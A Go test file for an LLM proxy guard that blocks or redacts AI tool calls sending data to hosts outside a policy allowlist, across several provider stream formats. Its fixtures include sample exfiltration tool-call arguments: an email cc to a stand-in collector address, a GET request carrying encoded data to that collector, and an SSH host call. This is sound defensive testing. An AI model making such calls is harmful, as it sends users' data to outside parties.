package proxy

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/yatuk/tamga/internal/policy"
	"github.com/yatuk/tamga/internal/scanner"
)

// output_rules.tool_destinations holds where tool calls in an answer send
// data, buffered and streamed, in every shape the guard reads.

const destPolicyYAML = `
version: "1.0"
output_rules:
  enabled: true
  block_on: [tool_destination]
  streaming:
    enabled: true
  tool_destinations:
    - tools: [send_email, "mcp__mail__*"]
      allow: [example.com]
    - tools: ["http_*"]
      allow: [api.example.com, "*.internal.example"]
`

func destPolicy(t *testing.T, yaml string) *policy.Policy {
	t.Helper()
	return mustPolicy(t, yaml)
}

// destGuard is a stream guard wired as the handler wires it, with the
// policy's destinations.
func destGuard(pol *policy.Policy) *streamGuard {
	reg := scanner.NewRegistry()
	reg.Register(scanner.NewPIIScanner())
	out := scanner.NewRegistry()
	out.Register(scanner.NewLinkScanner(nil))
	g := newStreamGuard()
	g.scan = func(text []byte) ([]scanner.Finding, error) {
		return scanStreamText(context.Background(), reg, out, text, scanner.PipelineConfig{})
	}
	g.scanSegs = withToolDestinations(pol, streamSegmentScanner(context.Background(), reg, out, scanner.PipelineConfig{}))
	g.blocks = func(f scanner.Finding) bool { return pol.EvaluateOutput([]scanner.Finding{f}) == policy.ActionBlock }
	g.redacts = pol.OutputRedacts
	return g
}

const (
	argsOutside = `{"to":"ayse@example.com","cc":["ops@collector.example.net"],"subject":"Notlar","body":"Ekte."}`
	argsInside  = `{"to":"ayse@example.com","cc":["mehmet@mail.example.com"],"subject":"Notlar","body":"Ekte."}`
	argsFetch   = `{"url":"https://collector.example.net/c?d=bm90bGFy","method":"GET"}`
	argsFetchOK = `{"url":"https://api.example.com/v1/rates","method":"GET"}`
	argsHost    = `{"host":"10.0.4.9","port":22,"path":"/srv/backup"}`
	argsHostOK  = `{"host":"db.internal.example","port":5432}`
)

func TestToolDestinations_ChatStream(t *testing.T) {
	pol := destPolicy(t, destPolicyYAML)
	cases := []struct {
		tool, args string
		stop       bool
	}{
		{"send_email", argsOutside, true},
		{"send_email", argsInside, false},
		{"mcp__mail__send", argsOutside, true},
		{"http_get", argsFetch, true},
		{"http_get", argsFetchOK, false},
		{"http_ssh", argsHost, true},
		{"http_db", argsHostOK, false},
		// A tool no entry names is not checked.
		{"send_message", argsOutside, false},
	}
	for _, c := range cases {
		for _, frags := range [][]string{{c.args}, pieces(c.args, 3), pieces(c.args, 17)} {
			evs := append([][]byte{chatRole()}, chatToolCall(0, "call_1", c.tool, frags)...)
			evs = append(evs, chatToolFinish)
			g := destGuard(pol)
			wire, stopped := feed(g, evs)
			if stopped != c.stop {
				t.Fatalf("%s %s in %d pieces: stopped = %v (%s)", c.tool, c.args, len(frags), stopped, g.stopReason)
			}
			if stopped && strings.Contains(wire, "collector.example.net") {
				t.Fatalf("%s: the address reached the client:\n%s", c.tool, wire)
			}
			if !stopped {
				st := chatAccumulate(t, wire)
				sameJSON(t, st.Tools[0].Args, c.args, c.tool)
			}
		}
	}
}

func TestToolDestinations_AnthropicResponsesGeminiStreams(t *testing.T) {
	pol := destPolicy(t, destPolicyYAML)
	for _, stop := range []bool{true, false} {
		args := argsInside
		if stop {
			args = argsOutside
		}
		shapes := map[string][][]byte{
			"anthropic": append(append([][]byte{anthropicMessageStart}, anthropicToolCall(0, "toolu_1", "send_email", pieces(args, 5))...), anthropicMessageDelta, anthropicMessageStop),
			"responses": append(responsesToolCall(0, "fc_1", "send_email", args, pieces(args, 7)), responsesCompleted(responsesItem("fc_1", "send_email", args, "completed"))),
			"gemini":    {geminiChunk(`{"functionCall":{"name":"send_email","args":`+args+`}}`, ""), geminiChunk(`{"text":""}`, "STOP")},
		}
		for shape, evs := range shapes {
			g := destGuard(pol)
			wire, stopped := feed(g, evs)
			if stopped != stop {
				t.Fatalf("%s, outside=%v: stopped = %v (%s)\n%s", shape, stop, stopped, g.stopReason, wire)
			}
			if stopped && strings.Contains(wire, "collector.example.net") {
				t.Fatalf("%s: the address reached the client:\n%s", shape, wire)
			}
		}
	}
}

// A tool call whose name the stream never gives is held only to an entry
// for "*".
func TestToolDestinations_UnnamedCallsMeetOnlyTheStarEntry(t *testing.T) {
	evs := [][]byte{chatRole(), chatToolArgs(0, argsOutside), chatToolFinish}
	pol := destPolicy(t, destPolicyYAML)
	if _, stopped := feed(destGuard(pol), evs); stopped {
		t.Fatal("an unnamed tool call met an entry that names its tools")
	}
	star := destPolicy(t, strings.Replace(destPolicyYAML, `"http_*"`, `"*"`, 1))
	if _, stopped := feed(destGuard(star), evs); !stopped {
		t.Fatal("an unnamed tool call passed an entry for every tool")
	}
}

func TestToolDestinations_Buffered(t *testing.T) {
	answer := func(name, args string) []byte {
		b, _ := json.Marshal(map[string]any{"choices": []any{map[string]any{"index": 0, "finish_reason": "tool_calls", "message": map[string]any{
			"role": "assistant", "content": nil,
			"tool_calls": []any{map[string]any{"id": "call_1", "type": "function", "function": map[string]any{"name": name, "arguments": args}}},
		}}}})
		return b
	}
	pol := destPolicy(t, destPolicyYAML)
	for _, c := range []struct {
		name, args string
		want       policy.Action
	}{
		{"send_email", argsOutside, policy.ActionBlock},
		{"send_email", argsInside, policy.ActionPass},
		{"http_get", argsFetch, policy.ActionBlock},
		{"send_message", argsOutside, policy.ActionPass},
	} {
		res, err := scanResponseBody(context.Background(), testRegistry(), nil, pol, ProviderFor("openai"), answer(c.name, c.args), 0, scanner.PipelineConfig{})
		if err != nil {
			t.Fatal(err)
		}
		if res.action != c.want {
			t.Fatalf("%s %s: action %s, want %s (%+v)", c.name, c.args, res.action, c.want, res.findings)
		}
		if c.want == policy.ActionBlock {
			var f *scanner.Finding
			for i := range res.findings {
				if res.findings[i].Type == scanner.ToolDestinationFindingType {
					f = &res.findings[i]
				}
			}
			if f == nil || f.Match != "collector.example.net" || f.Metadata["tool"] != c.name || f.Path == "" {
				t.Fatalf("finding = %+v", f)
			}
		}
	}

	// redact_on masks the address and keeps the call.
	redact := destPolicy(t, strings.Replace(destPolicyYAML, "block_on: [tool_destination]", "redact_on: [tool_destination]", 1))
	res, err := scanResponseBody(context.Background(), testRegistry(), nil, redact, ProviderFor("openai"), answer("send_email", argsOutside), 0, scanner.PipelineConfig{})
	if err != nil || res.action != policy.ActionRedact || res.redacted == nil {
		t.Fatalf("action %s, redacted %s, err %v", res.action, res.redacted, err)
	}
	if strings.Contains(string(res.redacted), "collector.example.net") || !strings.Contains(string(res.redacted), "ayse@example.com") {
		t.Fatalf("redacted answer: %s", res.redacted)
	}
}

// The validation of the section.
func TestToolDestinations_Validation(t *testing.T) {
	if _, err := policy.LoadFromBytes([]byte(strings.Replace(destPolicyYAML, "allow: [example.com]", "allow: [\"https://example.com\"]", 1))); err == nil {
		t.Fatal("an allow entry with a scheme loaded")
	}
	if _, err := policy.LoadFromBytes([]byte(strings.Replace(destPolicyYAML, "tools: [send_email, \"mcp__mail__*\"]", "tools: []", 1))); err == nil {
		t.Fatal("an entry without tools loaded")
	}
	p := destPolicy(t, strings.Replace(destPolicyYAML, "block_on: [tool_destination]", "block_on: []", 1))
	warned := false
	for _, is := range policy.ValidateSemantics(p) {
		if is.Field == "output_rules.tool_destinations" && is.Rule == "record_only" {
			warned = true
		}
	}
	if !warned {
		t.Fatal("no warning that the findings are only recorded")
	}
}
